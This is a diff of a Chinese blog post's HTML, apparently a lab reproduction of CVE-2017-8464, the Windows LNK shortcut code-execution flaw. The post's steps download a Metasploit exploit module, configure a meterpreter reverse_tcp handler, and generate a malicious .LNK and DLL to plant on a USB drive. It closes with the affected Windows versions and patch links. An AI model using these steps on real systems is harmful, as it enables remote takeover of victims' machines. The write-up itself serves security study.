@@ -84,19 +84,19 @@
 
 
 
-<meta name="description" content="介绍：名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞 概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 复现：攻击机kali：192.168.86.180 靶机win10（64">
+<meta name="description" content="介绍名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞 概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 复现：攻击机kali：192.168.86.180 靶机win10（64位">
 <meta property="og:type" content="article">
 <meta property="og:title" content="LNK文件（快捷方式）远程代码执行漏洞（复现）">
 <meta property="og:url" content="http://sunu11.com/2017/08/29/17/index.html">
 <meta property="og:site_name" content="SuNu11&#39;Blog">
-<meta property="og:description" content="介绍：名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞 概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 复现：攻击机kali：192.168.86.180 靶机win10（64">
+<meta property="og:description" content="介绍名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞 概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 复现：攻击机kali：192.168.86.180 靶机win10（64位">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-21.png">
 <meta property="og:image" content="http://ofum8yjv2.bkt.clouddn.com/q-22.png">
-<meta property="og:updated_time" content="2017-08-29T12:53:02.000Z">
+<meta property="og:updated_time" content="2017-08-29T13:14:00.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="LNK文件（快捷方式）远程代码执行漏洞（复现）">
-<meta name="twitter:description" content="介绍：名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞 概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 复现：攻击机kali：192.168.86.180 靶机win10（64">
+<meta name="twitter:description" content="介绍名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞 概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。 复现：攻击机kali：192.168.86.180 靶机win10（64位">
 <meta name="twitter:image" content="http://ofum8yjv2.bkt.clouddn.com/q-21.png">
 
 
@@ -370,20 +370,18 @@
       
 
       
-        <h3 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h3><p>名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞</p>
+        <h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>名称：CVE-2017-8464 LNK文件（快捷方式）远程代码执行漏洞</p>
 <p>概要：攻击者可以通过可移动驱动器（U盘）或远程共享等方式将包含恶意LNK文件和与之相关的恶意二进制文件传播给用户。当用户通过Windows资源管理器或任何能够解析LNK文件的程序打开恶意的LNK文件时，与之关联的恶意二进制代码将在目标系统上执行。</p>
 <h3 id="复现："><a href="#复现：" class="headerlink" title="复现："></a>复现：</h3><p>攻击机kali：192.168.86.180</p>
 <p>靶机win10（64位）：192.168.86.177</p>
 <p>首先kali下载exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Cd /opt</div><div class="line">Wget   https://raw.githubusercontent.com/ykoster/metasploit-framework/169e00bf3442447324df064192db62cdc5b5b860/modules/exploits/windows/fileformat/cve_2017_8464_lnk_rce.rb</div></pre></td></tr></table></figure></p>
-<p>Copy exp到/usr/share/metasploit-framework/modules/exploit/windows/smb/目录下</p>
-<p><code>cp  cve_2017_8464_lnk_rce.rb  /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></p>
-<p>生成监听shell：</p>
+<p>Copy exp到/usr/share/metasploit-framework/modules/exploit/windows/smb/目录下<br><code>cp  cve_2017_8464_lnk_rce.rb  /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></p>
+<p>生成监听shell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">msf &gt; use exploit/multi/handler   使用exploit/multi/handler监听连入的backdoor</div><div class="line">msf exploit(handler) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp 设置对应的payload</div><div class="line">msf exploit(handler) &gt; set LHOST 192.168.86.180</div></pre></td></tr></table></figure>
 <p>生成.LNK文件</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">use exploit/windows/smb/cve_2017_8464_lnk_rce</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; set LHOST 192.168.86.180</div><div class="line">msf exploit(cve_2017_8464_lnk_rce) &gt; exploit</div></pre></td></tr></table></figure>
 <p>将生成的dll文件和以U盘盘符结尾的.LNK文件复制到U盘中；当插入U盘至主机，在靶机上双击.LNK文件，即可触发dll文件建立连接。</p>
-<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-21.png" alt="1"></p>
-<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-22.png" alt="2"></p>
+<p><img src="http://ofum8yjv2.bkt.clouddn.com/q-21.png" alt="q-18"><br><img src="http://ofum8yjv2.bkt.clouddn.com/q-22.png" alt="q-18"></p>
 <h3 id="影响版本："><a href="#影响版本：" class="headerlink" title="影响版本："></a>影响版本：</h3><p>桌面系统：Windows 10, 7, 8.1, 8, Vista和Windows RT 8.1<br>服务器系统：Windows Server 2016，2012，2008</p>
 <h3 id="修复："><a href="#修复：" class="headerlink" title="修复："></a>修复：</h3><p>桌面系统Windows 10,7,8.1和Windows RT 8.1；服务器系统：Windows Server 2016，2012，2008，可以通过Windows Update自动更新微软补丁的方式进行修复。<br>Windows 8, Vista可以通过选择对应版本然后手动更新补丁的方式进行更新<br>（补丁下载地址参考）<a href="https://support.microsoft.com/zh-cn/help/4025687/microsoft-security-advisory-4025685-guidance-for-older-platforms" target="_blank" rel="external">https://support.microsoft.com/zh-cn/help/4025687/microsoft-security-advisory-4025685-guidance-for-older-platforms</a></p>
 
@@ -624,7 +622,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍："><span class="nav-number">1.</span> <span class="nav-text">介绍：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#复现："><span class="nav-number">2.</span> <span class="nav-text">复现：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响版本："><span class="nav-number">3.</span> <span class="nav-text">影响版本：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复："><span class="nav-number">4.</span> <span class="nav-text">修复：</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#介绍"><span class="nav-number">1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#复现："><span class="nav-number">2.</span> <span class="nav-text">复现：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#影响版本："><span class="nav-number">3.</span> <span class="nav-text">影响版本：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#修复："><span class="nav-number">4.</span> <span class="nav-text">修复：</span></a></li></ol></div>
             
 
           </div>
